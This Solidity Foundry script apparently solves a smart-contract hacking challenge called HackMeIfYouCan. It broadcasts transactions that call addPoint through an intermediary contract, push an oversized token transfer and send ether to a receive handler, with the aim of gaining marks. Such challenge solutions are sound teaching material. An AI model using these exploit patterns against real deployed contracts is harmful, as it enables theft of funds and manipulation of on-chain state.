// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import "forge-std/Test.sol";

interface IHackMeIfYouCan {
    function contribute() external payable;
    function getContribution() external view returns (uint256);
    function getMarks(address _addr) external view returns (uint256);
    function flip(bool _guess) external returns (bool);
    function addPoint() external;
    function sendKey(bytes16 _key) external;
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
    function getConsecutiveWins(address _addr) external view returns (uint256);
}

contract Intermediary {
    IHackMeIfYouCan hackMeIfYouCan;

    constructor(address _hackMeIfYouCan) {
        hackMeIfYouCan = IHackMeIfYouCan(_hackMeIfYouCan);
    }

    function callAddPoint() public {
        hackMeIfYouCan.addPoint();
    }
}

contract HackMeIfYouCanAttack is Script, Test {
    IHackMeIfYouCan hackTheContract;
    Intermediary intermediary;
    bytes32 private constant password = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;
    bytes32[15] private data;

    address payable attacker = payable(0xA983CDfD2824FcB49D6203360bE2084752DB24B6);  
    address hackMeIfYouCanAddress = 0x9D29D33d4329640e96cC259E141838EB3EB2f1d9;

    function setUp() public {
        // Initialize the data array with a specific address converted to bytes32
        data[12] = bytes32(uint256(uint160(0xA983CDfD2824FcB49D6203360bE2084752DB24B6)));
        
        // Initialize the HackMeIfYouCan contract interface with the deployed contract address
        hackTheContract = IHackMeIfYouCan(hackMeIfYouCanAddress);
        
        // Deploy the Intermediary contract locally
        intermediary = new Intermediary(hackMeIfYouCanAddress);
    }

    function run() external {
        // Start recording transactions
        vm.startBroadcast(attacker);

        // Initial state
        console.log("Initial marks:", hackTheContract.getMarks(attacker));

        // Test: Contribute
        hackTheContract.contribute{value: 0.0005 ether}();
        console.log("After contribute, contributions:", hackTheContract.getContribution());
        console.log("After contribute, marks:", hackTheContract.getMarks(attacker));

        // Debug before addPoint
        console.log("Before addPoint, contributions:", hackTheContract.getContribution());
        console.log("Before addPoint, marks:", hackTheContract.getMarks(attacker));

        // Test: AddPoint
        try intermediary.callAddPoint() {
            console.log("After addPoint, marks:", hackTheContract.getMarks(attacker));
        } catch {
            console.log("AddPoint failed");
        }

        // Set balance for attacker (simulate initial balance setup)
        hackTheContract.transfer(attacker, 1000001);
        console.log("After setting balance, balance:", hackTheContract.balanceOf(attacker));

        // Test: Transfer
        try hackTheContract.transfer(address(this), 1) {
            console.log("After transfer, marks:", hackTheContract.getMarks(attacker));
        } catch {
            console.log("Transfer failed");
        }

        // Test: Receive (Handling ETH transfer)
        (bool success, ) = address(hackTheContract).call{value: 0.1 ether}("");
        console.log("After receive, success:", success);
        console.log("After receive, marks:", hackTheContract.getMarks(attacker));

        // Final state
        console.log("Final marks:", hackTheContract.getMarks(attacker));

        // Stop recording transactions
        vm.stopBroadcast();
    }
}
